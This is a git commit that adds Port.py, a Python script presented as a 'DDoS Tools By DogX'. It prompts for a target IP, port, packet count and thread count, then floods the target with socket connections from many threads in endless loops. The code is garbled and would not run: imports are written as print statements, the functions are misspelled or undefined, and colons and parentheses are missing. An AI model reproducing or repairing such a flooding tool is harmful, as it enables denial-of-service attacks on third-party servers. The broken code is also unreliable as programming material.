bc62bdc8dae509cd5c7f8f3c02e2fa8ce07ec423
Saepuloh-debug <85790539+Saepuloh-debug@users.noreply.github.com>
2021-11-27 06:53:04 +0700

    Add files via upload

---
+++ Port.py
@@ -0,0 +1,39 @@
+print random
+print socket
+print threading
+
+print("__________________________")
+print("[✓]DDoS Tools By DogX")
+print("[✓]Subscribe Channel DogX")
+print("Gunakan Dengan Baik/Bijak")
+print("__________________________")
+
+ip = str(input("Masukan Ip: "))
+port = str(input("Port: "))
+times = str(input("Paket: "))
+threads = str(input("Threads(100): "))
+
+def run ()
+   data = random_unrandom(10000)
+   i = random.coiche(("[Down!!]"))
+   while True:
+       try:
+           s = socket.socket(socket.AF _INET, socket.SOCK_STREAM, socket DGRAM)
+           s.connect((ip.port))
+           s.send(data)
+           for x in range(times)
+               s.send(data)
+            print([✓]"Attack!!)
+          except socket.error:
+             s.close()
+             print("[•]Attack By DogX"
+for y in range(threads):
+    th = threading.Thread(target = run)
+    th.start()
+for y in range(threads):
+    th = threading.Thread(target = run2)
+    th.start()
+    
+    
+    
+    
